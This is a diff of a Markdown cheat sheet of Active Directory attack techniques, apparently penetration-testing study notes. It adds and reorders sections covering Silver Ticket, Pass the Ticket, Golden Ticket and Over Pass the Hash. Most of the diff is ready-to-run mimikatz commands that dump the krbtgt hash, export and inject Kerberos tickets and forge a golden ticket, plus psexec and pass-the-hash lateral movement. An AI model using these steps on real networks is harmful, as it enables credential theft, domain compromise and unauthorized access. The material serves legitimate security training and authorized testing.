@@ -119,7 +119,7 @@ list_tokens
 impersonate_token <token>  
 ```
 
-## Silver Ticket - Pass the Ticket (Forge own TGS service ticket)
+## Silver Ticket (Forge own TGS service ticket)
 - Precondition1: Privileged Account Certificate (PAC) validation **not enabled**
 - Precondition2: obtain that service account's password hash (via Kerberoasting or other means), it could then forge a TGS for that SPN and access the service that utilizes it
 - Principle: the application blindly trusts the integrity of the service ticket since it is encrypted with a password hash that is, in theory, only known to the service account and the domain controller.
@@ -169,29 +169,6 @@ mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 cmd> psexec.exe -accepteula \\<remote_hostname> cmd   # psexec
 cmd> sqlcmd.exe -S [service_hostname]                 # if service is MSSQL
 
-```
-
-## Golden Ticket - Pass the Ticket (Forge own TGT)
-- It is a persistence and elevation of privilege technique where tickets are forged to take control of the Active Directory Key Distribution Service (KRBTGT) account and issue TGT's.
-
-- Get hash krbtgt
-```
-./mimikatz.exe "privilege::debug" "lsadump::lsa /patch"
-```
-- Get SID
-```
-GetDomainsid (PowerView)
-```
-or  
-```
-whoami /user
-```
-
-- Exploitation
-```
-mimikatz.exe "kerberos::purge" "kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt" "misc::cmd"
-
-psexec.exe \\dc1 cmd.exe
 ```
 
 ## AS-REP roasting
@@ -391,8 +368,7 @@ pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:<hash_ntlm> //<IP> 
 ```
 
 
-## Over Pass the Hash
-
+## Over Pass the Hash (exploit user hash and make a TGT)
 Allows an attacker to abuse an NTLM user hash to obtain a full Kerberos ticket granting ticket (TGT) or service ticket (TGS), which grants us access to another machine or service as that user
 
 - obtain NTLM hash of current user in current context e.g. running notepad as Jen
@@ -417,7 +393,51 @@ net use \\files04
 .\PsExec.exe \\files04 cmd
 ```
 
+## Pass the Ticket (extract Dave WEB-04 TGS from memory into our own session)
+- Export Cache TGT/TGS to disk
+```
+privilege::debug
+sekurlsa::tickets /export
+```
+- View exported TGT/TGS
+```
+dir *.kirbi
+```
+- Pick any TGS ticket in the dave@cifs-web04.kirbi format and inject it through mimikatz via the kerberos::ptt command.
+```
+kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
+```
+- inspect loaded ticket in memory
+```
+klist
+```
+- once verified that Dave ticket is loaded in memory, we go to our powershell and access Web04
+```
+ls \\web04\backup
+```
 
+## Golden Ticket - Pass the Ticket (Forge own TGT)
+
+- Get hash krbtgt
+```
+./mimikatz.exe "privilege::debug"
+./mimikatz.exe "lsadump::lsa /patch"
+```
+- Get SID
+```
+GetDomainsid (PowerView)
+```
+or  
+```
+whoami /user
+```
+
+- Exploitation
+```
+mimikatz.exe "kerberos::purge" "kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt" "misc::cmd"
+
+psexec.exe \\dc1 cmd.exe
+```
 
 
 
